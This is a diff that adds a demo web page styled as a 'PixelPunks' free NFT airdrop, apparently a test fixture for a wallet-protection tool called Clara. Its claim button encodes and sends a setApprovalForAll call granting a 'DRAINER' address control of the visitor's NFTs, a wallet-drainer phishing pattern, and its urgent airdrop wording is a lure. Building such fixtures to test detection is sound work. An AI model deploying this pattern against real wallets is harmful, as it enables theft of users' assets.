@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>PixelPunks — Free Airdrop</title>
+<style>
+  :root{--bg:#0b0714;--surface:#160f26;--text:#ece7ff;--muted:#9a8fc0;--acid:#c6ff5e;--line:#2a2140}
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:radial-gradient(1000px 500px at 70% -10%,rgba(198,255,94,.08),transparent),var(--bg);
+    color:var(--text);font-family:system-ui,sans-serif;min-height:100vh;display:grid;place-items:center;padding:24px}
+  .card{max-width:440px;background:var(--surface);border:1px solid var(--line);border-radius:20px;padding:34px;text-align:center}
+  .logo{font-size:34px;font-weight:800;letter-spacing:-.02em;margin-bottom:6px}
+  .logo span{color:var(--acid)}
+  .tag{color:var(--muted);font-size:14px;margin-bottom:26px}
+  .art{font-size:64px;margin:10px 0 22px}
+  button{width:100%;font-family:inherit;font-size:15px;font-weight:600;border:none;border-radius:12px;
+    padding:14px;margin-top:10px;cursor:pointer}
+  .primary{background:var(--acid);color:#0b0714}
+  .ghost{background:transparent;color:var(--text);border:1px solid var(--line)}
+  .status{margin-top:18px;font-size:13px;color:var(--muted);min-height:20px;font-family:ui-monospace,monospace;overflow-wrap:anywhere}
+  .note{margin-top:22px;font-size:11px;color:var(--muted);opacity:.7}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">Pixel<span>Punks</span></div>
+    <div class="tag">Claim your free airdrop before it's gone 🔥</div>
+    <div class="art">🎁</div>
+    <button class="primary" id="claim">Claim free NFT airdrop</button>
+    <button class="ghost" id="tip">Tip the artist · 0.001 ETH</button>
+    <div class="status" id="status">Not connected.</div>
+    <div class="note">Demo dApp for Clara. The “claim” button requests setApprovalForAll —
+      the exact drain pattern Clara is built to catch.</div>
+  </div>
+<script>
+  const NFT = '0x3333333333333333333333333333333333333333';
+  const DRAINER = '0x9999999999999999999999999999999999999999';
+  const ALICE = null; // replaced below with the engine address if available
+  const status = (m) => document.getElementById('status').textContent = m;
+  // setApprovalForAll(operator=DRAINER, approved=true) — selector a22cb465
+  const AFA = '0xa22cb465'
+    + DRAINER.slice(2).toLowerCase().padStart(64, '0')
+    + '1'.padStart(64, '0');
+
+  async function eth(method, params) {
+    if (!window.ethereum) { status('No wallet found. Install/enable Clara.'); return; }
+    try { return await window.ethereum.request({ method, params }); }
+    catch (e) { status('✗ ' + (e && e.message ? e.message : 'rejected')); throw e; }
+  }
+  async function acct() {
+    const a = await eth('eth_requestAccounts', []);
+    return a && a[0];
+  }
+  document.getElementById('claim').onclick = async () => {
+    const from = await acct(); if (!from) return;
+    status('Requesting approval…');
+    const r = await eth('eth_sendTransaction', [{ from, to: NFT, data: AFA }]);
+    status('✓ ' + JSON.stringify(r));
+  };
+  document.getElementById('tip').onclick = async () => {
+    const from = await acct(); if (!from) return;
+    status('Sending tip…');
+    const r = await eth('eth_sendTransaction', [{ from, to: from, value: '0x38d7ea4c68000' }]);
+    status('✓ ' + JSON.stringify(r));
+  };
+  if (window.ethereum) status('Clara provider detected. Ready.');
+</script>
+</body>
+</html>
